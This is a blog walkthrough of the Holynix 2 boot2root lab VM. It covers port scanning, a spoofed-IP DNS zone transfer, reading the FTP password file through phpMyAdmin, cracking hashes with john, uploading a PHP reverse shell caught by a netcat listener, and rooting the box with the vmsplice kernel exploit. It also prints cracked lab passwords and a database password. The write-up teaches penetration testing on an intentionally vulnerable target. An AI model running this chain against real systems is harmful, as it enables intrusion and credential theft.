---
layout: post
title: "Holynix hacking challenge: Part 2"
date: 2012-04-09 18:10:26 -0400
comments: true
categories: boot2root hacking
alias: /2012/04/holynix-hacking-challenge-part-2_09.html
---

On to Holynix 2, the last Holynix challenge as of this writing. Holynix 2 can be downloaded from [http://sourceforge.net/projects/holynix/files/2.0/](http://sourceforge.net/projects/holynix/files/2.0/). As before, Backtrack Linux is used as the attacking machine, and everything is run in a virtualized environment. Holynix 2 has a static IP address, so go over the README.txt file before starting and setup your network accordingly. 

<!--more-->

I ran netdiscover and found 192.168.1.88 as the IP address of the target machine. I fired up nmap to see what was running:

```
# nmap -sS -A -T4 -O 192.168.1.88
 
Starting Nmap 5.61TEST4 ( http://nmap.org ) at 2012-04-08 17:48 EDT
Warning: Servicescan failed to fill cpe_a (subjectlen: 319, devicetypelen: 32). Too long? Match string was line 491: d//
Nmap scan report for 192.168.1.88
Host is up (0.00048s latency).
Not shown: 995 filtered ports
PORT   STATE  SERVICE  VERSION
20/tcp closed ftp-data
21/tcp open   ftp      Pure-FTPd
|_ftp-bounce: no banner
22/tcp open   ssh      OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)
53/tcp open   domain   ISC BIND 9.4.2-P2.1
80/tcp open   http     Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.12 with Suhosin-Patch)
|_http-title: ZincFTP
|_http-methods: No Allow or Public header in OPTIONS response (status code 200)
MAC Address: 00:0C:29:13:21:B3 (VMware)
No exact OS matches for host (If you know what OS is running on it, see http://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=5.61TEST4%E=4%D=4/8%OT=21%CT=20%CU=34350%PV=Y%DS=1%DC=D%G=Y%M=000
OS:C29%TM=4F8207CF%P=i686-pc-linux-gnu)SEQ(SP=D3%GCD=1%ISR=EF%TI=Z%CI=Z%II=
OS:I%TS=7)SEQ(CI=Z%II=I)OPS(O1=M5B4ST11NW5%O2=M5B4ST11NW5%O3=M5B4NNT11NW5%O
OS:4=M5B4ST11NW5%O5=M5B4ST11NW5%O6=M5B4ST11)WIN(W1=16A0%W2=16A0%W3=16A0%W4=
OS:16A0%W5=16A0%W6=16A0)ECN(R=Y%DF=Y%T=41%W=16D0%O=M5B4NNSNW5%CC=N%Q=)ECN(R
OS:=N)T1(R=Y%DF=Y%T=41%S=O%A=S+%F=AS%RD=0%Q=)T1(R=N)T2(R=N)T3(R=N)T4(R=N)T5
OS:(R=Y%DF=Y%T=41%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=41%W=0%S=A%A=Z
OS:%F=R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=41%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=
OS:G%RUCK=G%RUD=G)U1(R=N)IE(R=Y%DFI=N%T=41%CD=S)
 
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:kernel
 
TRACEROUTE
HOP RTT     ADDRESS
1   0.48 ms 192.168.1.88
 
OS and Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 32.74 seconds
```

FTP, SSH, DNS, and HTTP. I pointed my browser to the website to look for anything interesting. It appeared to be registration form with some information about the nameservers used by the site.

![](/images/2012-04-09/01.png)

I decided to run nikto and sqlmap against the site. Unfortunately, nikto didn't find anything promising:

```
# ./nikto.pl -host 192.168.1.88
- Nikto v2.1.5
---------------------------------------------------------------------------
+ Target IP:          192.168.1.88
+ Target Hostname:    192.168.1.88
+ Target Port:        80
+ Start Time:         2012-04-08 17:55:05 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.12 with Suhosin-Patch
+ Retrieved x-powered-by header: PHP/5.2.4-2ubuntu5.12
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ PHP/5.2.4-2ubuntu5.12 appears to be outdated (current is at least 5.3.6)
+ Apache/2.2.8 appears to be outdated (current is at least Apache/2.2.19). Apache 1.3.42 (final release) and 2.0.64 are also current.
+ DEBUG HTTP verb may show server debugging information. See http://msdn.microsoft.com/en-us/library/e8z01xdh%28VS.80%29.aspx for details.
+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST
+ OSVDB-12184: /index.php?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+ OSVDB-3092: /register/: This might be interesting...
+ OSVDB-3268: /icons/: Directory indexing found.
+ OSVDB-3233: /icons/README: Apache default file found.
+ 6474 items checked: 1 error(s) and 9 item(s) reported on remote host
+ End Time:           2012-04-08 17:55:36 (GMT-4) (31 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

sqlmap was also unable to find any SQL injection vulnerabilities:

```
# ./sqlmap.py --url "192.168.1.88" --forms --dump-all
 
    sqlmap/1.0-dev (r4766) - automatic SQL injection and database takeover tool
    http://www.sqlmap.org
 
[!] legal disclaimer: usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Authors assume no liability and are not responsible for any misuse or damage caused by this program
 
[*] starting at 17:58:03
 
[17:58:03] [INFO] testing connection to the target url
[17:58:03] [INFO] heuristics detected web page charset 'ascii'
[17:58:03] [INFO] searching for forms
[#1] form:
POST http://192.168.1.88:80/register.php
POST data: username=&email=
do you want to test this form? [Y/n/q] 
> 
Edit POST data [default: username=&email=] (Warning: blank fields detected): 
do you want to fill blank fields with random values? [Y/n] 
[17:58:08] [INFO] using '/pentest/database/sqlmap/output/192.168.1.88/session' as session file
[17:58:08] [INFO] using '/pentest/database/sqlmap/output/results-04082012_0558pm.csv' as results file
[17:58:08] [INFO] heuristics detected web page charset 'ascii'
.
.
.
[17:58:12] [WARNING] POST parameter 'email' is not injectable
[17:58:12] [ERROR] all parameters appear to be not injectable. Try to increase --level/--risk values to perform more tests. Also, you can try to rerun by providing either a valid --string or a valid --regexp, refer to the user's manual for details, skipping to the next form
[17:58:12] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/pentest/database/sqlmap/output/results-04082012_0558pm.csv'
 
[*] shutting down at 17:58:12
```

The default level and risk parameters on sqlmap couldn't find any vulnerabilities. I increased the risk and level values to their maximum and tried again, but the results were the same. Thinking that there might be hidden directories on the server, I fired up DirBuster to go through a list of popular directories that may be on the server:

![](/images/2012-04-09/02.png)

I went back to the website and started entering random values on the form to see the behaviour. The form would complain when an email address was improperly formatted, so it was doing some input filtering. I tried entering commands into the username field, including terminating the name with a semicolon, ampersands, pipes, and trying to get other shell commands in there. It seemed however that it would treat the entire username as a string and save it somewhere. At this point, I wasn't sure if it was being saved into a flat file or a database. Entering the same username would result in an error, signifying that the username had already been recorded somewhere.

The other clue I had were the nameservers that were provided on the registration page. I ran dig to see what I could find:

```
# dig zincftp.com @192.168.1.88
 
; <<>> DiG 9.7.0-P1 <<>> zincftp.com @192.168.1.88
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 11930
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 2, ADDITIONAL: 2
 
;; QUESTION SECTION:
;zincftp.com.   IN A
 
;; ANSWER SECTION:
zincftp.com.  38400 IN A 192.168.1.88
 
;; AUTHORITY SECTION:
zincftp.com.  38400 IN NS ns2.zincftp.com.
zincftp.com.  38400 IN NS ns1.zincftp.com.
 
;; ADDITIONAL SECTION:
ns1.zincftp.com. 38400 IN A 192.168.1.88
ns2.zincftp.com. 38400 IN A 192.168.1.89
 
;; Query time: 1 msec
;; SERVER: 192.168.1.88#53(192.168.1.88)
;; WHEN: Sun Apr  8 18:07:45 2012
;; MSG SIZE  rcvd: 113
```

I found the IP address of the secondary nameserver, 192.168.1.89. However this machine was not currently running on the network. It occurred to me that the registration page notes that users who have a ZincFTP account have a webpage in the form of username.zincftp.com I thought that if I could do a zone transfer, then I might be able to get a list of those users:

```
# dig zincftp.com @192.168.1.88 axfr
 
; <<>> DiG 9.7.0-P1 <<>> zincftp.com @192.168.1.88 axfr
;; global options: +cmd
; Transfer failed.
```

No luck there, but then again, you can't really do a zone tranfer against any site. However, since the secondary nameserver was inactive, I decided to try setting my machine's IP to the secondary nameserver's IP and trying a zone transfer again. Primary and secondary nameservers usually trust each other to do a zone transfer, so it might work:

```
# ifconfig eth0 down
# ifconfig eth0 192.168.1.89 up
# dig @192.168.1.88 zincftp.com axfr
 
; <<>> DiG 9.7.0-P1 <<>> @192.168.1.88 zincftp.com axfr
; (1 server found)
;; global options: +cmd
zincftp.com.  38400 IN SOA ns1.zincftp.com. ns2.zincftp.com. 2006071801 28800 3600 604800 38400
zincftp.com.  38400 IN NS ns1.zincftp.com.
zincftp.com.  38400 IN NS ns2.zincftp.com.
zincftp.com.  38400 IN MX 10 mta.zincftp.com.
zincftp.com.  38400 IN A 192.168.1.88
ahuxley.zincftp.com. 38400 IN A 192.168.1.88
amckinley.zincftp.com. 38400 IN A 192.168.1.88
bzimmerman.zincftp.com. 38400 IN A 192.168.1.88
cbergey.zincftp.com. 38400 IN A 192.168.1.88
cfinnerly.zincftp.com. 38400 IN A 192.168.1.88
cjalong.zincftp.com. 38400 IN A 192.168.1.88
cmahong.zincftp.com. 38400 IN A 192.168.1.88
cmanson.zincftp.com. 38400 IN A 192.168.1.88
ddonnovan.zincftp.com. 38400 IN A 192.168.1.88
ddypsky.zincftp.com. 38400 IN A 192.168.1.88
dev.zincftp.com. 38400 IN A 192.168.1.88
dhammond.zincftp.com. 38400 IN A 192.168.1.88
dmoran.zincftp.com. 38400 IN A 192.168.1.88
dsummers.zincftp.com. 38400 IN A 192.168.1.88
evorhees.zincftp.com. 38400 IN A 192.168.1.88
gwelch.zincftp.com. 38400 IN A 192.168.1.88
hmcknight.zincftp.com. 38400 IN A 192.168.1.88
jgacy.zincftp.com. 38400 IN A 192.168.1.88
jsmith.zincftp.com. 38400 IN A 192.168.1.88
jstreet.zincftp.com. 38400 IN A 192.168.1.88
kmccallum.zincftp.com. 38400 IN A 192.168.1.88
lnickerbacher.zincftp.com. 38400 IN A 192.168.1.88
lsanderson.zincftp.com. 38400 IN A 192.168.1.88
lwestre.zincftp.com. 38400 IN A 192.168.1.88
mta.zincftp.com. 38400 IN A 10.0.192.48
ncobol.zincftp.com. 38400 IN A 192.168.1.88
ns1.zincftp.com. 38400 IN A 192.168.1.88
ns2.zincftp.com. 38400 IN A 192.168.1.89
rcropper.zincftp.com. 38400 IN A 192.168.1.88
rfrost.zincftp.com. 38400 IN A 192.168.1.88
rwoo.zincftp.com. 38400 IN A 192.168.1.88
skrymple.zincftp.com. 38400 IN A 192.168.1.88
splath.zincftp.com. 38400 IN A 192.168.1.88
tmartin.zincftp.com. 38400 IN A 192.168.1.88
trusted.zincftp.com. 38400 IN A 192.168.1.34
www.zincftp.com. 38400 IN A 192.168.1.88
zincftp.com.  38400 IN SOA ns1.zincftp.com. ns2.zincftp.com. 2006071801 28800 3600 604800 38400
;; Query time: 9 msec
;; SERVER: 192.168.1.88#53(192.168.1.88)
;; WHEN: Sun Apr  8 18:15:03 2012
;; XFR size: 42 records (messages 1, bytes 1021)
```

Excellent! Now I had obtained a list of usernames, including a couple of other interesting subdomains: mta.zincftp.com (mail server?) and trusted.zincftp.com
In order to access each user's site, I had to update /etc/resolv.conf and add 192.168.1.88 as the primary nameserver. I spent the next few minutes exploring each user's page. Many had nothing on their site, others had music files, videos, and pictures. I found one interesting file, which was a resume for user ddonnovan that identified him as the network administrator of the system. This meant that he might have access to higher privileges that would eventually lead to root access.

I went back to DirBuster to see if it had found any hidden directories. Sure enough, a few interesting ones were discovered:

![](/images/2012-04-09/03.png)

server-status, phpMyAdmin, and setup_guides. Attempting to access these directories resulted in 403 Forbidden errors. I remembered that there was a site called trusted.zincftp.com with IP address 192.168.1.34. I thought that if I used that IP address, I might have special access to these directories. Sure enough, after changing my IP address to 192.168.1.34, I was able to access phpMyAdmin and setup_guides, but not server-status.

The setup_guides directory had a todo file that contained instructions on how to add a new FTP user. This proved to be valuable information because it contained the location of the FTP user password file, /etc/pure-ftpd/pureftpd.passwd

Next was the phpMyAdmin directory. This brought me to the phpMyAdmin interface which allowed me to explore the contents of the zincftp_data directory. This database contained only one table user_requests which contained usernames and email addresses of people who submitted a registration on the front page. I checked to see what kind of privileges I had, and it looked like I could create tables and insert data. I decided to try to load the contents of /etc/pure-ftpd/pureftpd.passwd to a table. I started by creating a new table called ftp_passwords with one VARCHAR(100) field called password.

Next I clicked on the SQL tab and entered the following to load the contents of purftpd.passwd into the ftp_passwords table:

![](/images/2012-04-09/04.png)

phpMyAdmin replied with "Inserted rows: 31". I checked the contents of ftp_passwords and it contained usernames and encrypted passwords:

![](/images/2012-04-09/05.png)

I exported these into a text file and cleaned up the quotes around the strings. I passed these to john for cracking using a wordlist I obtained from http://contest-2010.korelogic.com/wordlists.html. If I could get one login, I might be able to SSH or FTP into the server.

```
# /pentest/passwords/john/john --wordlist=/wordlists/rockyou.txt ftppass 
```

After a while, three passwords were cracked:

```
cbergey:chatterbox1:1031:2002::/home/cbergey/./::::::::::::
tmartin:millionaire:1031:2002::/home/tmartin/./::::::::::::
ahuxley:bravenewworld:1031:2002::/home/ahuxley/./::::::::::::
```

It was time to try logging in.

```
# ssh ahuxley@192.168.1.88
ahuxley@192.168.1.88's password: 
Permission denied, please try again.
ahuxley@192.168.1.88's password: 
Permission denied, please try again.
ahuxley@192.168.1.88's password: 
```

SSH didn't work, but FTP proved to be more rewarding. I was able to FTP in as ahuxley, and knowing that I could read files and thus launch PHP files once I'd uploaded them into the FTP server, I would be able to launch a PHP reverse shell and gain shell access into the server:

```
# ftp 192.168.1.88
Connected to 192.168.1.88.
220---------- Welcome to Pure-FTPd [privsep] [TLS] ----------
220-You are user number 1 of 5 allowed.
220-Local time is now 05:36. Server port: 21.
220-This is a private system - No anonymous login
220-IPv6 connections are also welcome on this server.
220 You will be disconnected after 15 minutes of inactivity.
Name (192.168.1.88:root): ahuxley
331 User ahuxley OK. Password required
Password:
230-User ahuxley has group access to:  2002    
230 OK. Current directory is /
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> dir
200 PORT command successful
150 Connecting to port 44379
drwxr-xr-x    2 1031     2002         4096 Apr  7 12:36 web
226-Options: -l 
226 1 matches total
ftp> cd web
250 OK. Current directory is /web
ftp> put rshell.php
local: rshell.php remote: rshell.php
200 PORT command successful
150 Connecting to port 54359
226-File successfully transferred
226 0.014 seconds (measured here), 379.54 Kbytes per second
5494 bytes sent in 0.00 secs (10882.8 kB/s)
ftp> chmod 0755 rshell.php
200 Permissions changed on rshell.php
ftp> 
```

You can get a PHP reverse shell from anywhere, I got mine from [http://pentestmonkey.net/tools/web-shells/php-reverse-shell](http://pentestmonkey.net/tools/web-shells/php-reverse-shell). I configured my reverse shell to connect to port 9998, so I fired up nc to listen to that port. Once nc was running, I headed over to http://ahuxley.zincftp.com/rshell.php and got my reverse shell on nc:

```
# nc -lvp 9998
listening on [any] 9998 ...
192.168.1.88: inverse host lookup failed: Unknown server error : Connection timed out
connect to [192.168.1.34] from (UNKNOWN) [192.168.1.88] 60455
Linux holynix2 2.6.22-14-server #1 SMP Sun Oct 14 23:34:23 GMT 2007 i686 GNU/Linux
 05:43:19 up 1 day,  6:34,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: can't access tty; job control turned off
$ 
```

I was logged in as www-data, and there were no sudo privileges setup for this user account. I checked the contents of /etc/passwd and found only a few users had shell access to the system:

```
lsanderson:x:1000:114:Lyle Sanderson:/home/lsanderson:/bin/bash
cfinnerly:x:1001:100:Chuck Finnerly:/home/cfinnerly:/bin/bash
ddonnovan:x:1002:100:David Donnovan:/home/ddonnovan:/bin/bash
skrymple:x:1003:100:Shelly Krymple:/home/skrymple:/bin/bash
amckinley:x:1004:100:Agustin Mckinley:/home/amckinley:/bin/bash
```

Unfortunately I hadn't cracked any of those user's passwords yet. I checked /var/mail but it was empty. I found a directory called /var/www/dev which contained a PHP file that listed the MySQL password for the root user.

```
$db_host = 'localhost';
 $db_user = 'root';
 $db_pass = 'dynamo59956783';
 $db_name = '_zincftp_data';
 $conn = mysql_connect($db_host, $db_user, $db_pass) or die("Unable to connect to MySQL");
 mysql_select_db($db_name,$conn) or die("Could not select Database");
```

I tried to SSH to the server again as root with this password, but the attempt failed. /var/www/htdocs contained a similar file, except the database credentials were for phpMyAdmin.
I checked out the processes that were running, looked at the crontab files, and looked for any interesting files that might elevate my current privileges. I found several image files and a couple of RAR files that were password protected. I used crark to try to crack the passwords for the RAR files, but that proved fruitless. I checked the image files for any hidden messages using stegdetect but came up empty.

I started looking for local exploits, and started off with local kernel exploits. The server was running on 2.6.22-14. Using Google, I found references to a vmsplice local root exploit. I checked exploit-db and found them:

```
# ./searchsploit vmsplice
 Description                                                                 Path
--------------------------------------------------------------------------- -------------------------
Linux Kernel 2.6.17 - 2.6.24.1 vmsplice Local Root Exploit                  /linux/local/5092.c
Linux Kernel 2.6.17 - 2.6.24.1 vmsplice Local Root Exploit                  /linux/local/5092.c
Linux Kernel 2.6.17 - 2.6.24.1 vmsplice Local Root Exploit                  /linux/local/5092.c
Linux Kernel 2.6.23 - 2.6.24 vmsplice Local Root Exploit                    /linux/local/5093.c
Linux Kernel 2.6.23 - 2.6.24 vmsplice Local Root Exploit                    /linux/local/5093.c
Linux Kernel 2.6.23 - 2.6.24 vmsplice Local Root Exploit                    /linux/local/5093.c
```

I transferred 5092.c and 5093.c to ahuxley's home directory via FTP, then using www-data, copied them over to /tmp. I decided to copy both over because in some cases one exploit will fail while another will work right off the bat, so better to just have them all ready to go.
I compiled 5092.c and ran the executable and got a root shell instantly! The game was over, the server had been successfully compromised.

```
$ cp /home/ahuxley/web/*.c . 
$ ls -latr
total 20
drwxr-xr-x 21 root     root     4096 Dec  5  2010 ..
-rw-r--r--  1 www-data www-data 2883 Apr  7 15:43 5093.c
-rw-r--r--  1 www-data www-data 6293 Apr  7 15:43 5092.c
drwxrwxrwt  2 root     root     4096 Apr  7 15:43 .
$ ls -l
total 12
-rw-r--r-- 1 www-data www-data 6293 Apr  7 15:43 5092.c
-rw-r--r-- 1 www-data www-data 2883 Apr  7 15:43 5093.c
$ gcc -o 5092 5092.c
$ ./5092
bash: no job control in this shell
root@holynix2:/tmp# id
uid=0(root) gid=0(root) groups=33(www-data)
```

This was an interesting exercise, a bit different from the past few ones that I've completed, with the DNS zone transfer trick and switching IP addresses around. It's the last of the Holynix challenges, but there are other challenges to come. Definitely a great way to keep those creative brain juices flowing.
